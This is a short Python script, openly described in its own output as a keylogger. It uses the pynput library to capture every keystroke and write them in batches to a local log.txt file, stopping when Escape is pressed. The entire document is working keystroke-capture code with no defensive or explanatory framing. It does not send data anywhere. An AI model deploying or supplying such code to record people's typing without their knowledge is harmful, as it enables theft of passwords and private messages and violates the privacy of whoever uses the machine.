from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count > 10:
        count = 0
        write_file(keys)
        keys = []

    if key == Key.esc:
        print("Exiting keylogger, saving logs into a txt file....")


def write_file(keys):
    key_count = 0
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(f"Key {key_count}: {str(k)}\n")
            key_count += 1


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
